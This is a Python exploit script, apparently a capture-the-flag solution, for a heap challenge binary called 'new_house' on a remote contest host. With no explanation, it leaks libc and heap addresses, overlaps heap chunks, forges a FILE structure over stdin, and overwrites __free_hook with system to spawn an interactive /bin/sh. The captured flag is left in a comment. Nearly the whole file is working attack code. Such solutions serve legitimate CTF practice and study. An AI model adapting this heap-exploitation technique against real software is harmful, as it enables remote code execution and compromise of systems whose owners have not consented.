#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './new_house'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'flu.xxx', 'port':10170})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_stdin    = binf.symbols['stdin']

libc = ELF(env.libc) if env.libc else binf.libc

#==========

def attack(conn, **kwargs):
    conn.recvuntil(b'ground: ')
    libc.address = int(conn.recvline(), 16)
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_free_hook     = libc.symbols['__free_hook']
    addr_libc_file_jumps    = libc.symbols['__GI__IO_file_jumps']
    addr_libc_system        = libc.sep_function['system']

    nh = NewHouse(conn)

    nh.add(b'a'*0x10, 0xf50-8) # 0
    addr_heap_base = u(nh.list()[0][0x10:]) - 0x10
    info('addr_heap_base    = 0x{:012x}'.format(addr_heap_base))

    nh.add(b'b'*8, 0xb0-8)  # 1
    nh.delete(1)
    nh.add(b'c'*8, 0x18)    # 2
    nh.design(1, flat(0,0,0,0x91))

    nh.add(b'd'*8, 0x100)   # 3
    nh.design(1, flat(0,0,0, 0x71, addr_stdin-0x13))

    nh.add(b'e'*8, 0x68)    # 4
    nh.add(b'f'*8, 0x68)    # 5

    fake_file  = p64(0xfbad208b)
    fake_file += b'\x00'*0x30
    fake_file += p64(addr_libc_free_hook-1)
    fake_file += p64(addr_libc_free_hook+8)
    fake_file  = fake_file.ljust(0x88, b'\x00')
    fake_file += p64(addr_heap_base + 0x22000)
    fake_file  = fake_file.ljust(0xd8, b'\x00')
    fake_file += p64(addr_libc_file_jumps)

    nh.design(3, fake_file)
    nh.design(4, b'/bin/sh\x00')
    nh.design(5, b'X'*3 + p64(addr_heap_base + 0x21010) + p64(0) + p32(9) + p32(2))

    conn.sendlineafter(b'>>> ', b'2')
    conn.sendlineafter(b'number? ', b'4'+p64(addr_libc_system))

class NewHouse:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def add(self, name, size):
        self.sendlineafter(b'>>> ', b'1')
        self.sendafter(b'name? ', name)
        self.sendlineafter(b'size? ', str(size).encode())

    def delete(self, num):
        self.sendlineafter(b'>>> ', b'2')
        self.sendlineafter(b'number? ', str(num).encode())

    def design(self, num, data):
        self.sendlineafter(b'>>> ', b'3')
        self.sendlineafter(b'number? ', str(num).encode())
        self.sendlineafter(b'room? ', data)

    def list(self):
        self.sendlineafter(b'>>> ', b'4')
        data = self.recvuntil(b'\nrooms', drop=True).split(b'room-')
        return list(map(lambda x: x[3:], data))[1:]

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{Th1s_1s_H0w_Y0u_bu1ld_Th3_H0us3_0f_G0ds}

if __name__=='__main__':
    main()

#==========
